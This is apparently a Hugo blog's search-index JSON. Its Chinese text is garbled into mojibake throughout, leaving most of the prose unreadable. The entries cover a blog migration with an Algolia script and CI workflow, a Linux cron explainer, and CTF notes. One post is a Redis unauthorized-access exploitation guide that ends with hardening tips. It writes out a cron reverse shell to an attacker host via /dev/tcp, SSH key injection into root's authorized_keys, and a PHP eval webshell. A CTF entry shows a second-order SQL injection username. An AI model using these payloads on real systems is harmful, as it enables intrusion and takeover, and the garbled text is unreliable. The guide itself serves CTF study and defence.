[{"categories":["å¿ƒè·¯å†ç¨‹"],"content":" å‰å‡ å¤©çŒ›ç„¶å‘ç°è‡ªå·±çš„åšå®¢å·²ç»å¥½å¤šå¤©æ²¡æ›´æ–°äº†ï¼Œç¿»äº†ä¸€åœˆå‘ç°åšå®¢æºç ä¹Ÿè¢«æˆ‘å¼„ä¸¢äº†ï¼Œç”±äºä¸æƒ³å†é…ä¸€é Hexo å’Œä¾èµ–çš„å„ç§åº“ï¼ˆå…¶å®å°±æ˜¯æ‡’ï¼Œç´¢æ€§ç›´æ¥æŠŠåšå®¢è¿ç§»åˆ°äº† Hugo ","date":"2021-05-31","objectID":"/posts/blog-migration/:0:0","tags":["Blog","Hugo"],"title":"åšå®¢è¿ç§»è®°","uri":"/posts/blog-migration/"},{"categories":["å¿ƒè·¯å†ç¨‹"],"content":"0x00 å®‰è£… Hugo Windows ç”¨æˆ·åªèƒ½è¯´ Scoop çœŸé¦™ scoop install hugo-extended è‡³äºä¸ºä»€ä¹ˆè¦å®‰è£… extened ç‰ˆæœ¬ï¼Œå…¶å®æˆ‘æœ€å¼€å§‹è£…çš„æ˜¯å¦ä¸€ä¸ªç‰ˆæœ¬ï¼Œç„¶åå‘ç°å¥½å¤šä¸»é¢˜éƒ½ç”¨ä¸äº†ï¼Œæ¯”å¦‚æ™®é€šç‰ˆæœ¬å°±æ²¡æœ‰ scss æ”¯æŒï¼ŒGoogle äº†ä¸€åœˆæ‰å‘ç°éœ€è¦è£… extended é¡ºå¸¦ä¸€æï¼ŒåŸæ¥ Hugo çš„ Stars å·²ç»è¶…è¿‡ Jekyll äº† ","date":"2021-05-31","objectID":"/posts/blog-migration/:1:0","tags":["Blog","Hugo"],"title":"åšå®¢è¿ç§»è®°","uri":"/posts/blog-migration/"},{"categories":["å¿ƒè·¯å†ç¨‹"],"content":"0x01 é€‰ä¸»é¢˜ ä¼—æ‰€å‘¨çŸ¥ï¼Œæ­åšå®¢æœ€éš¾çš„ä¸€æ­¥æ˜¯é€‰ä¸€ä¸ªå¥½çœ‹çš„ä¸»é¢˜ï¼ˆæ›¾ç»å› ä¸ºæ²¡æ‰¾åˆ°å¥½çœ‹çš„ä¸»é¢˜è€Œæ”¾å¼ƒäº† Wordpress æŠŠå®˜æ–¹çš„ä¸»é¢˜åˆ—è¡¨ç¿»äº†ä¸ªåº•æœå¤©ï¼Œæœ€åé€‰äº†è¿™ä¸ªæœ€ç¬¦åˆæˆ‘å®¡ç¾çš„ LoveItï¼Œå›½äººå¼€å‘çš„ï¼Œè¿˜æ˜¯ä¸­æ–‡æ–‡æ¡£çœ‹ç€èˆ’æœ ç®€å•çœ‹äº†ä¸€ä¸‹ä»‹ç»ï¼ŒåŠŸèƒ½æŒºé½å…¨çš„ï¼Œæœç´¢è¯„è®ºè¿™äº›åŠŸèƒ½éƒ½æ˜¯å¼€ç®±å³ç”¨ï¼Œè¿˜è®°å¾—ä¹‹å‰ Hexo é‚£ä¸ªä¸»é¢˜ä¸ºäº†åŠ ä¸ªæœç´¢åŠŸèƒ½è‡ªå·±æ”¹äº†åŠå¤©æ¨¡æ¿ ä¸»é¢˜çš„æ–‡æ¡£å†™çš„æŒºå…¨é¢çš„ï¼Œå„ä¸ªé…ç½®é¡¹éƒ½æœ‰æ˜ç¡®çš„ä»‹ç»ï¼Œç”¨åˆ°ä»€ä¹ˆå°±åˆ°æ–‡æ¡£é‡Œæœç´¢ä¸€ä¸‹å°±å¥½ï¼Œè¿™é‡Œè¯´ä¸¤ä¸ªæ–‡æ¡£é‡Œæ²¡æœ‰æ¶‰åŠåˆ°çš„é—®é¢˜ ","date":"2021-05-31","objectID":"/posts/blog-migration/:2:0","tags":["Blog","Hugo"],"title":"åšå®¢è¿ç§»è®°","uri":"/posts/blog-migration/"},{"categories":["å¿ƒè·¯å†ç¨‹"],"content":"Algolia Search çš„é…ç½® åœ¨åšå®¢é‡Œé…ç½®åŸºäº Algolia çš„æœç´¢åŠŸèƒ½åªéœ€è¦åœ¨é…ç½®æ–‡ä»¶é‡ŒåŠ å‡ ä¸ªç›¸å…³çš„é…ç½®é¡¹å°±å¯ï¼Œè¿™é‡Œè¯´ä¸€ä¸‹å°†ç”Ÿæˆçš„ json ä¸Šä¼ åˆ° Algolia ä»¥åº”ç”¨æœç´¢çš„æ“ä½œ è¿™é‡Œåšå®¢çš„ä½œè€…æ¨èäº†ä¸€ä¸ªåŸºäº nodejs çš„åº“ Algolia Atomicï¼Œç”±äºæ‡’å¾—é… nodejs è€Œä¸” Algolia å®˜æ–¹ API å…¶å®éå¸¸å®Œå–„ï¼Œæˆ‘å°±ç›´æ¥ç”¨ python ç³Šäº†ä¸€ä¸ªå°è„šæœ¬ï¼Œç”±äºæˆ‘æŠŠåšå®¢çš„éƒ¨ç½²ç›´æ¥æ”¾åˆ°äº† Github Action ä¸Šï¼Œæ‰€ä»¥å°±çº¦ç­‰äºæ¯æ¬¡éƒ¨ç½²éƒ½è‡ªåŠ¨ä¸Šä¼ äº†ï¼Œè¿™é‡Œå°±éšä¾¿æ”¾ä¸€ä¸‹ç³Šå‡ºæ¥çš„è„šæœ¬ from algoliasearch.search_client import SearchClient import json import os import sys def read_json(filename: str) -\u003e list: with open(filename, 'r', encoding='utf-8') as file: return json.load(file) def main(): if len(sys.argv) != 2: print(\"Filename is needed.\") exit(1) filename = sys.argv[1] ALGOLIA_APPID = os.getenv('ALGOLIA_APPID') ALGOLIA_ADMIN_KEY = os.getenv('ALGOLIA_ADMIN_KEY') ALGOLIA_INDEX = os.getenv('ALGOLIA_INDEX') if ALGOLIA_APPID == None or ALGOLIA_ADMIN_KEY == None or ALGOLIA_INDEX == None: print(\"APPID and ADMIN_KEY and INDEX is needed.\") exit(1) client = SearchClient.create(ALGOLIA_APPID, ALGOLIA_ADMIN_KEY) index = client.init_index(ALGOLIA_INDEX) print(\"=== Clear Objects ===\") res = index.clear_objects() print(res.raw_responses) objects = read_json(filename) print(\"=== Add Objects ===\") res = index.save_objects(objects, {'autoGenerateObjectIDIfNotExist': True}) print(res.raw_responses) if __name__ == '__main__': main() ","date":"2021-05-31","objectID":"/posts/blog-migration/:2:1","tags":["Blog","Hugo"],"title":"åšå®¢è¿ç§»è®°","uri":"/posts/blog-migration/"},{"categories":["å¿ƒè·¯å†ç¨‹"],"content":"æ–‡ç« çš„åŠ å¯† æœ‰çš„æ—¶å€™å†™çš„åšå®¢ä¸æƒ³è¢«åˆ«äººçœ‹åˆ°æ€ä¹ˆåŠå‘¢ï¼ŒåŠ å¯†ä¸€ä¸‹å°±å¥½äº† æ–‡ç« çš„åŠ å¯†å¯¹äºåŸºäº nodejs è¿™ç§è„šæœ¬è¯­è¨€çš„ Hexo æ¥è¯´ç®€ç›´è½»è€Œæ˜“ä¸¾ï¼Œnpm è£…ä¸ªæ’ä»¶å°±å®Œäº‹äº† ä½†æ˜¯ Hugo æ˜¯ç”¨ Golang å†™çš„ï¼Œæ²¡æœ‰é‚£ä¹ˆå¥½çš„æ’ä»¶åŒ–æ“ä½œï¼Œæ‰¾äº†ä¸€ä¸‹æ‰¾åˆ°äº†è¿™ä¸ª Hugo Encryptorï¼Œè¿˜æ˜¯ Vidar çš„ Web å¤§ä½¬å†™çš„ï¼ˆæˆ‘ç›´æ¥è†œ åªæ˜¯éœ€è¦æ¯æ¬¡ build ä¹‹åå¤šè¿è¡Œä¸€ä¸ªè„šæœ¬ï¼ŒGithub Action åŠ ä¸€è¡Œå°±å¥½äº† ","date":"2021-05-31","objectID":"/posts/blog-migration/:2:2","tags":["Blog","Hugo"],"title":"åšå®¢è¿ç§»è®°","uri":"/posts/blog-migration/"},{"categories":["å¿ƒè·¯å†ç¨‹"],"content":"0x02 è‡ªåŠ¨åŒ–éƒ¨ç½² Hugo çš„å®˜æ–¹æ–‡æ¡£è´´å¿ƒçš„æä¾›äº† Github Action éƒ¨ç½²çš„è¯¦ç»†æ–‡æ¡£ï¼Œæˆ‘å°±åœ¨å®ƒçš„åŸºç¡€ä¸Šç¨ä½œä¿®æ”¹ï¼Œä¸€ä¸ªæ˜¯å¤šè¿è¡Œäº†ä¸€äº›è„šæœ¬ï¼ˆæ–‡ç« åŠ å¯†ã€ä¸Šä¼  jsonï¼‰ï¼Œè¿˜æœ‰å°±æ˜¯æˆ‘çš„åšå®¢æºç å’Œ Github Pages æ”¾åœ¨äº†ä¸åŒä»“åº“ï¼Œéœ€è¦æ¨é€åˆ°å¦ä¸€ä¸ªä»“åº“ è¿™é‡ŒæŠŠæˆ‘çš„ workflow é…ç½®ä¹Ÿè´´ä¸€ä¸‹å§ï¼ˆéšä¾¿ç³Šçš„ï¼Œå¤§ä½¬è½»å–· name:Blogon:push:branches:- masterjobs:deploy:runs-on:ubuntu-18.04steps:- uses:actions/checkout@v2with:submodules:truefetch-depth:0- name:Setup Hugouses:peaceiris/actions-hugo@v2with:hugo-version:'latest'extended:true- name:Setup Othersrun:|sudo apt install python3 pip3 install --upgrade 'algoliasearch\u003e=2.0,\u003c3.0' --user pip3 install setuptools --user pip3 install -r plugins/hugo_encryptor/requirements.txt --user- name:Buildenv:ALGOLIA_ADMIN_KEY:${{ secrets.ALGOLIA_ADMIN_KEY }}ALGOLIA_APPID:${{ secrets.ALGOLIA_APPID }}ALGOLIA_INDEX:${{ secrets.ALGOLIA_INDEX }}run:|hugo python3 plugins/hugo_encryptor/hugo-encryptor.py python3 plugins/algolia_upload/upload.py public/index.json- name:Deployuses:peaceiris/actions-gh-pages@v3with:deploy_key:${{ secrets.ACTIONS_DEPLOY_KEY }}external_repository:X5tar/x5tar.github.iopublish_branch:masterpublish_dir:./publicfull_commit_message:${{ github.event.head_commit.message }} ","date":"2021-05-31","objectID":"/posts/blog-migration/:3:0","tags":["Blog","Hugo"],"title":"åšå®¢è¿ç§»è®°","uri":"/posts/blog-migration/"},{"categories":["å¿ƒè·¯å†ç¨‹"],"content":"0x03 å°¾è®° è¿™æ¬¡è¿ç§»æ•´ä½“æ²¡é‡åˆ°ä»€ä¹ˆéšœç¢ï¼ŒåŠ èµ·æ¥ä¹Ÿå°±ä¸åˆ°ä¸¤ä¸ªå°æ—¶å°±å®Œæˆäº†ï¼Œè€Œä¸”ä¸»è¦æ—¶é—´éƒ½ç”¨åœ¨é€‰ä¸»é¢˜å’Œå¤åˆ¶ç²˜è´´åŸæ¥çš„æ–‡ç« äº†ï¼Œä»¥åé‡åˆ°ä»€ä¹ˆé—®é¢˜å†æ¥æ›´å§ æºœäº†æºœäº†ï¼Œæ˜å¤©å°±è€ƒå¯†ç å­¦äº†ç°åœ¨è¿˜æ²¡å­¦å®Œï¼ˆ ","date":"2021-05-31","objectID":"/posts/blog-migration/:4:0","tags":["Blog","Hugo"],"title":"åšå®¢è¿ç§»è®°","uri":"/posts/blog-migration/"},{"categories":null,"content":"å¤§ä½¬ä»¬çš„åšå®¢ï¼ˆè†œ Neorahï¼šhttps://neorah.me/ evi0sï¼šhttps://evi0s.com/ enivs0rtï¼šhttps://enivs0rt.github.io/ æˆ³æˆ³é¾™ï¼šhttps://ccdragon.cc/ æœ¨å¶ï¼šhttps://muouim.github.io/ ","date":"2021-05-31","objectID":"/friends/:0:0","tags":null,"title":"ğŸŒŸ's Friends","uri":"/friends/"},{"categories":null,"content":"è‡ªæˆ‘ä»‹ç»ï¼ˆè¿«çœŸ æŸç”·å­èŒä¸šæŠ€æœ¯å­¦é™¢åœ¨è¯» CNSS / CTFer / WEBğŸ¶ è·Ÿéšå¤§ä½¬ä»¬è„šæ­¥çš„èœé¸¡ ä¸šä½™ä»£ç æ¬è¿å·¥ LOL æœ€å¼ºé»‘é“ï¼Œ0 / 21 / 0 ","date":"2021-05-31","objectID":"/about/:0:0","tags":null,"title":"About ğŸŒŸ","uri":"/about/"},{"categories":["WEB"],"content":"0x00 å‰è¨€ åˆ·é¢˜æ—¶é‡åˆ°äº†æ¶‰åŠåˆ° Redis æœªæˆæƒè®¿é—®çš„é¢˜ï¼Œå‘ç°è‡ªå·±ä¸ä¼šï¼Œæ•…æ€»ç»“ä¸€ä¸‹ Redis æœªæˆæƒè®¿é—®çš„åˆ©ç”¨æ–¹æ³• ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:1:0","tags":["WEBå®‰å…¨","Redis"],"title":"Redis æœªæˆæƒè®¿é—®","uri":"/posts/redis-unauthorized-access/"},{"categories":["WEB"],"content":"0x01 Redis ä»‹ç» Redis æ˜¯ä¸€ä¸ªä½¿ç”¨ ANSI C ç¼–å†™çš„å¼€æºã€æ”¯æŒç½‘ç»œã€åŸºäºå†…å­˜ã€å¯é€‰æŒä¹…æ€§çš„é”®å€¼å¯¹å­˜å‚¨æ•°æ®åº“ Redis é€šå¸¸å°†å…¨éƒ¨çš„æ•°æ®å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œä½†ä¹Ÿå¯ä»¥å°†æ•°æ®æŒä¹…åŒ–å­˜å‚¨åœ¨ç¡¬ç›˜ä¸­ï¼ˆæ•°æ®æŒä¹…åŒ–ç»™äº†æˆ‘ä»¬åˆ©ç”¨çš„æœºä¼šï¼‰ ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:2:0","tags":["WEBå®‰å…¨","Redis"],"title":"Redis æœªæˆæƒè®¿é—®","uri":"/posts/redis-unauthorized-access/"},{"categories":["WEB"],"content":"0x02 ç¯å¢ƒæ­å»º å®‰è£… redis åï¼Œåœ¨é…ç½®æ–‡ä»¶ redis.conf ä¸­ bind 127.0.0.1 ::1 ä¸€è¡Œå‰åŠ  # å°†å…¶æ³¨é‡Šï¼Œå¹¶å°† protected-mode è®¾ä¸º no ï¼Œç„¶åå¯åŠ¨ redis-server ç„¶ååœ¨æ”»å‡»æœºä¸Šè¾“å…¥ redis-cli -h ç›®æ ‡IP å‘½ä»¤è¿æ¥ç›®æ ‡æœºå™¨çš„ redis-serverï¼Œè‹¥è¿æ¥æˆåŠŸåˆ™ç¯å¢ƒæ­å»ºå®Œæˆ ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:3:0","tags":["WEBå®‰å…¨","Redis"],"title":"Redis æœªæˆæƒè®¿é—®","uri":"/posts/redis-unauthorized-access/"},{"categories":["WEB"],"content":"0x03 åˆ©ç”¨æ–¹æ³• ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:4:0","tags":["WEBå®‰å…¨","Redis"],"title":"Redis æœªæˆæƒè®¿é—®","uri":"/posts/redis-unauthorized-access/"},{"categories":["WEB"],"content":"1. åˆ©ç”¨ Cron å®šæ—¶ä»»åŠ¡åå¼¹ shell å…³äº Linux Cron å®šæ—¶ä»»åŠ¡è§å¦ä¸€ç¯‡åšå®¢ [Linux Cron å®šæ—¶ä»»åŠ¡](https://x5tar.com/2020/06/21/linux-crontab/) æœ¬æ–¹æ³•é€‚ç”¨äºç›®æ ‡æœºå™¨ä»¥ root èº«ä»½å¯åŠ¨ Redis çš„æƒ…å†µ å…ˆåœ¨æ”»å‡»æœºä¸Šç›‘å¬ä»»æ„ç«¯å£ nc -lvvp Port ç„¶ååœ¨è¿æ¥çš„ redis-cli æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼ˆç¬¬ä¸€è¡Œå‘½ä»¤å¯ä»¥æ¢ä¸ºå…¶å®ƒä»»ä½•å¯ä»¥åå¼¹ shell çš„å‘½ä»¤ï¼‰ \u003e set x \"\\n* * * * * bash -i \u003e\u0026 /dev/tcp/æ”»å‡»æœºIP/Port 0\u003e\u00261\\n\" OK \u003e config set dir /var/spool/cron/ OK \u003e config set dbfilename root OK \u003e save OK ç¨ç­‰ç‰‡åˆ»å³å¯åœ¨æ”»å‡»æœºæ¥æ”¶åˆ°å›å¼¹çš„ shell è‹¥é•¿æ—¶é—´æœªæ¥æ”¶åˆ°ï¼Œå¯å°è¯•å°†ç¬¬äºŒè¡Œå‘½ä»¤ä¸­çš„ç›®å½•æ”¹ä¸º /var/spool/cron/crontabs å†æ¬¡å°è¯• ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:4:1","tags":["WEBå®‰å…¨","Redis"],"title":"Redis æœªæˆæƒè®¿é—®","uri":"/posts/redis-unauthorized-access/"},{"categories":["WEB"],"content":"2. å†™å…¥å…¬é’¥å¹¶åˆ©ç”¨ ssh è¿æ¥ æœ¬æ–¹æ³•é€‚ç”¨äºç›®æ ‡æœºå™¨å®‰è£…å¹¶å¯åŠ¨äº† ssh server çš„æƒ…å†µ ä½¿ç”¨æœ¬æ–¹æ³•éœ€è¦çŸ¥é“å¯åŠ¨ redis çš„ç”¨æˆ·çš„ home ç›®å½• å…ˆåœ¨æ”»å‡»æœºç”Ÿæˆ ssh å…¬é’¥ï¼ˆå·²å­˜åœ¨å…¬é’¥æ— éœ€é‡å¤ç”Ÿæˆï¼Œé˜²æ­¢è¦†ç›–ï¼‰ ssh-keygen -t rsa ç„¶ååœ¨ ~/.ssh ç›®å½•ä¸‹æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ (echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\") | redis-cli -h ç›®æ ‡æœºå™¨IP -x set x ç„¶ååœ¨è¿æ¥çš„ redis-cli æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼ˆæ­¤å¤„å‡è®¾ç”¨æˆ·ä¸º rootï¼Œhome ç›®å½•ä¸º /homeï¼‰ \u003e config set dir /root/.ssh OK \u003e config set dbfilename authorized_keys OK \u003e save OK ç„¶ååœ¨æ”»å‡»æœºé€šè¿‡ ssh è¿æ¥ç›®æ ‡æœºå™¨å³å¯ ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:4:2","tags":["WEBå®‰å…¨","Redis"],"title":"Redis æœªæˆæƒè®¿é—®","uri":"/posts/redis-unauthorized-access/"},{"categories":["WEB"],"content":"3. å†™å…¥ webshell æœ¬æ–¹æ³•é€‚ç”¨äº redis ç”¨æˆ·æƒé™è¾ƒä½ä½†å¯¹ web ç›®å½•æœ‰å†™æƒé™çš„æƒ…å†µ ä½¿ç”¨æœ¬æ–¹æ³•éœ€è¦çŸ¥é“ web ç›®å½•çš„ç»å¯¹è·¯å¾„ åœ¨è¿æ¥çš„ redis-cli æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼ˆæ­¤å¤„å‡è®¾ç›®æ ‡æœºå™¨è¿è¡Œ PHPï¼‰ \u003e set x \"\\n\u003c?php eval($_POST['cmd']); ?\u003e\\n\" OK \u003e config set dir /var/www/html OK \u003e config set dbfilename evil.php OK \u003e save OK ç„¶åè¿æ¥ webshell å³å¯ ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:4:3","tags":["WEBå®‰å…¨","Redis"],"title":"Redis æœªæˆæƒè®¿é—®","uri":"/posts/redis-unauthorized-access/"},{"categories":["WEB"],"content":"4. åˆ©ç”¨ lua è„šæœ¬è¿›è¡Œæ“ä½œ åœ¨å…¶å®ƒåœ°æ–¹çœ‹åˆ°çš„ï¼Œä½†æ˜¯åœ¨ Redis é‡Œç”šè‡³è¿ IO åº“å’Œ OS åº“éƒ½ä¸èƒ½ç”¨ï¼Œæš‚æœªå‘ç°å¯é çš„åˆ©ç”¨æ–¹æ³• ä» Redis 2.6.0 ç‰ˆæœ¬å¼€å§‹ï¼ŒRedis å†…ç½®äº† lua è§£é‡Šå™¨ï¼Œå¯ä»¥é€šè¿‡ lua è„šæœ¬è¿›è¡Œä¸€äº›æ“ä½œ \u003e eval \"return 'hello'\" 0 \"hello\" ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:4:4","tags":["WEBå®‰å…¨","Redis"],"title":"Redis æœªæˆæƒè®¿é—®","uri":"/posts/redis-unauthorized-access/"},{"categories":["WEB"],"content":"5. å…¶å®ƒæ–¹æ³• æ—¢ç„¶é€šè¿‡ Redis æœªæˆæƒè®¿é—®è·å¾—äº†å†™å…¥æ–‡ä»¶çš„æƒé™ï¼Œåˆ™å¯æ ¹æ®ç›®æ ‡æœºå™¨å¯åŠ¨çš„æœåŠ¡ï¼Œé’ˆå¯¹æ€§çš„ä½¿ç”¨å…¶å®ƒæ–¹æ³•è¿›è¡Œè¿›ä¸€æ­¥æ¸—é€ ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:4:5","tags":["WEBå®‰å…¨","Redis"],"title":"Redis æœªæˆæƒè®¿é—®","uri":"/posts/redis-unauthorized-access/"},{"categories":["WEB"],"content":"0x04 å®‰å…¨é…ç½® Redis æœªæˆæƒè®¿é—®å±å®³è¾ƒå¤§ï¼Œæ•…æ ¹æ®ä»¥ä¸Šåˆ©ç”¨æ–¹æ³•ï¼Œå¯é’ˆå¯¹æ€§çš„è¿›è¡Œä»¥ä¸‹é…ç½®ï¼Œå¢å¼ºå®‰å…¨æ€§ ä»…ç»‘å®šéƒ¨åˆ†åœ°å€ï¼Œé™åˆ¶å¯è®¿é—®çš„ IP ä¿®æ”¹ Redis ç›‘å¬ç«¯å£ ä¸ºç”¨æˆ·è®¾ç½®å¯†ç  ä»¥å•ç‹¬çš„ä½æƒé™ç”¨æˆ·å¯åŠ¨ Redisï¼Œå¹¶ç¦æ­¢ç™»å½• ç¦æ­¢ä½¿ç”¨æˆ–ä¿®æ”¹é«˜å±å‘½ä»¤åç§°ï¼ˆrename-commandï¼‰ ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:5:0","tags":["WEBå®‰å…¨","Redis"],"title":"Redis æœªæˆæƒè®¿é—®","uri":"/posts/redis-unauthorized-access/"},{"categories":["æ‚äº‹"],"content":"0x00 å‰è¨€ åœ¨åšä¸€é“æ¶‰åŠåˆ° redis æœªæˆæƒè®¿é—®çš„é¢˜çš„æ—¶å€™ï¼Œçœ‹åˆ°äº†ä½¿ç”¨åˆ° /var/spool/cron/ ç›®å½•åå¼¹ shell åæŸ¥è¯¢å¾—çŸ¥ Linux Cron å®šæ—¶ä»»åŠ¡ï¼Œåœ¨æ­¤è®°å½•ä¸‹æ¥ ","date":"2020-06-21","objectID":"/posts/linux-crontab/:1:0","tags":["Linux"],"title":"Linux Cron å®šæ—¶ä»»åŠ¡","uri":"/posts/linux-crontab/"},{"categories":["æ‚äº‹"],"content":"0x01 ç›¸å…³æ–‡ä»¶ ä¸ Cron ç›¸å…³çš„æ–‡ä»¶ä¸»è¦å­˜åœ¨ä»¥ä¸‹å‡ ä¸ªç›®å½• /var/spool/cron/ ç›®å½•ä¸‹å­˜æ”¾çš„æ˜¯æ¯ä¸ªç”¨æˆ·çš„ crontab ä»»åŠ¡ï¼Œæ¯ä¸ªä»»åŠ¡ä»¥åˆ›å»ºè€…çš„åå­—å‘½å /etc/crontab è¿™ä¸ªæ–‡ä»¶è´Ÿè´£è°ƒåº¦å„ç§ç®¡ç†å’Œç»´æŠ¤ä»»åŠ¡ /etc/cron.d/ è¿™ä¸ªç›®å½•ç”¨æ¥å­˜æ”¾ä»»ä½•è¦æ‰§è¡Œçš„ crontab æ–‡ä»¶æˆ–è„šæœ¬ æˆ‘ä»¬è¿˜å¯ä»¥æŠŠè„šæœ¬æ”¾åœ¨/etc/cron.hourly ã€ /etc/cron.daily ã€ /etc/cron.weekly ã€ /etc/cron.monthly ç›®å½•ä¸­ï¼Œè®©å®ƒæ¯å°æ—¶/å¤©/æ˜ŸæœŸ/æœˆæ‰§è¡Œä¸€æ¬¡ å…¶ä¸­ /var/spool/cron/ ä¸ºæœ€å¸¸ç”¨çš„è„šæœ¬å­˜æ”¾ä½ç½®ï¼Œä¸€èˆ¬ç”± crontab å‘½ä»¤æ“ä½œ ","date":"2020-06-21","objectID":"/posts/linux-crontab/:2:0","tags":["Linux"],"title":"Linux Cron å®šæ—¶ä»»åŠ¡","uri":"/posts/linux-crontab/"},{"categories":["æ‚äº‹"],"content":"0x02 Crontab å‘½ä»¤æ“ä½œ æŸ¥çœ‹ crontab å‘½ä»¤çš„å¸®åŠ©å¦‚ä¸‹ Usage: crontab [options] file crontab [options] crontab -n [hostname] Options: -u \u003cuser\u003e define user -e edit user's crontab -l list user's crontab -r delete user's crontab -i prompt before deleting -n \u003chost\u003e set host in cluster to run users' crontabs -c get host in cluster to run users' crontabs -V print version and exit -x \u003cmask\u003e enable debugging å…¶ä¸­å¸¸ç”¨çš„é€‰é¡¹æœ‰ -e ã€ -l ã€ -r -e ç”¨äºç¼–è¾‘é…ç½®æ–‡ä»¶ï¼ˆå³ä½¿ç”¨é»˜è®¤ç¼–è¾‘å™¨ç¼–è¾‘ /var/spool/cron/$USER æ–‡ä»¶ï¼‰ -l ç”¨äºè¯»å–é…ç½®æ–‡ä»¶ï¼ˆå³æ˜¾ç¤º /var/spool/cron/$USER æ–‡ä»¶å†…å®¹ï¼‰ -r ç”¨äºåˆ é™¤é…ç½®æ–‡ä»¶ï¼ˆå³åˆ é™¤ /var/spool/cron/$USER æ–‡ä»¶ï¼‰ ","date":"2020-06-21","objectID":"/posts/linux-crontab/:3:0","tags":["Linux"],"title":"Linux Cron å®šæ—¶ä»»åŠ¡","uri":"/posts/linux-crontab/"},{"categories":["æ‚äº‹"],"content":"0x03 é…ç½®æ–‡ä»¶å†…å®¹ åšé¢˜è¿‡ç¨‹ä¸­ç”¨åˆ°çš„æ–‡ä»¶ä¸º /var/spool/cron/root æ³¨æ„ï¼š /var/spool/cron/ ç›®å½•æ‰€æœ‰è€…ä¸º rootï¼Œæƒé™ä¸º 755ï¼Œåªæœ‰ root ç”¨æˆ·æ‰èƒ½åˆ›å»ºæ–‡ä»¶ ä½† crontab ç”Ÿæˆçš„é…ç½®æ–‡ä»¶æ‰€æœ‰è€…ä¸ºåˆ›å»ºçš„ç”¨æˆ·ä¸ºåˆ›å»ºç”¨æˆ·ï¼Œæƒé™ä¸º 600 æ‰€ä»¥åªæœ‰åœ¨ä»¥ root ç”¨æˆ·ç™»å½•æˆ–å½“å‰ç™»å½•ç”¨æˆ·å·²åˆ›å»ºå®šæ—¶ä»»åŠ¡æ—¶æ‰å¯ç›´æ¥ä¿®æ”¹è¯¥æ–‡ä»¶ å†™å…¥çš„å†…å®¹ä¸ºï¼ˆå…¶ä¸­ command å³ä¸ºåå¼¹ shell çš„å‘½ä»¤ï¼‰ * * * * * command è¯¥æ–‡ä»¶ä¸­ä¸€è¡Œå‘½ä»¤ç”±å…­éƒ¨åˆ†ç»„æˆï¼Œå‰äº”éƒ¨åˆ†åˆ†åˆ«ä¸º åˆ†ã€æ—¶ã€æ—¥ã€æœˆã€å‘¨ï¼Œæœ€åä¸€éƒ¨åˆ†ä¸ºå¾…æ‰§è¡Œçš„å‘½ä»¤ æ—¶é—´éƒ¨åˆ†å¯ç”¨çš„æ“ä½œç¬¦æœ‰ * æ‰€æœ‰æ—¶é—´ / æ—¶é—´é—´éš” - æ—¶é—´èŒƒå›´ , å•ç‹¬çš„æ—¶é—´ æ‰€ä»¥ä¸Šè¿°å†™å…¥å†…å®¹ä¸ºæ¯éš”ä¸€åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ commandï¼Œå³å¯è¾¾åˆ°è‡ªåŠ¨æ‰§è¡Œçš„ç›®çš„ å¦é™„å‡ ä¸ªä¸Šè¿°æ“ä½œç¬¦çš„ä½¿ç”¨ç¤ºä¾‹ */10 8-16 * * * command æ¯å¤©çš„ 8-16 æ—¶æ¯ 10 åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ 0,30 * * * * command æ¯å°æ—¶çš„ 0 åˆ†å’Œ 30 åˆ†å„æ‰§è¡Œä¸€æ¬¡ 0 9 */2 * * command æ¯éš”ä¸¤å¤©çš„ 9:00 æ‰§è¡Œä¸€æ¬¡ 0,20,40 8-16 * * 6,0 command æ¯å‘¨å…­å’Œå‘¨æ—¥çš„ 8-16 æ—¶çš„ 0 20 40 åˆ†å„æ‰§è¡Œä¸€æ¬¡ ","date":"2020-06-21","objectID":"/posts/linux-crontab/:4:0","tags":["Linux"],"title":"Linux Cron å®šæ—¶ä»»åŠ¡","uri":"/posts/linux-crontab/"},{"categories":["CTF"],"content":"å‰è¨€ è¢«å·å¤§çš„åŒå­¦å«æ¥æ‰“è¿™ä¸ªæ¯”èµ› å—¯æ²¡é”™è¿™æ¬¡æ¯”èµ›éå¸¸ç¥å¥‡ï¼Œæ°´å‡ºæ¥çš„ RE å’Œ Crypto éƒ½æ¯” WEB å¤šâ€¦ æ¯”èµ›çš„æ—¶å€™å°±åšå‡ºæ¥ä¸€é“ WEBï¼ˆçœŸçš„èœ ","date":"2020-05-27","objectID":"/posts/geekgame2020/:1:0","tags":["WriteUp"],"title":"GeekGame 2020 WEB å¤ç°","uri":"/posts/geekgame2020/"},{"categories":["CTF"],"content":"äºŒæ¬¡æ³¨å…¥ çœŸçš„æ˜¯è¿™æ¬¡æ¯”èµ›æœ€ç®€å•çš„ä¸€é“é¢˜äº† æœ€å¸¸è§„çš„äºŒæ¬¡æ³¨å…¥ å…ˆæ³¨å†Œä¸€ä¸ªåä¸º admin'# çš„ç”¨æˆ·ï¼Œç™»å½•åä¿®æ”¹å¯†ç  å†ç”¨ admin å’Œä¿®æ”¹åçš„å¯†ç ç™»å½•å³å¯ æ¯”èµ›çš„æ—¶å€™æ²¡å‘ç°æœ‰æºç æ³„éœ²ï¼Œç›´æ¥çœ‹ SQL è¯­å¥å¯èƒ½æ›´ç›´è§‚ä¸€äº› $x=$db-\u003eexecute(\"update users set password=? where username='$username' \",['s',\u0026$password]); ","date":"2020-05-27","objectID":"/posts/geekgame2020/:2:0","tags":["WriteUp"],"title":"GeekGame 2020 WEB å¤ç°","uri":"/posts/geekgame2020/"},{"categories":["CTF"],"content":"ååºåˆ—åŒ–ï¼Ÿ æ‰“å¼€æ˜¯ä¸ªæ–‡ä»¶ä¸Šä¼ 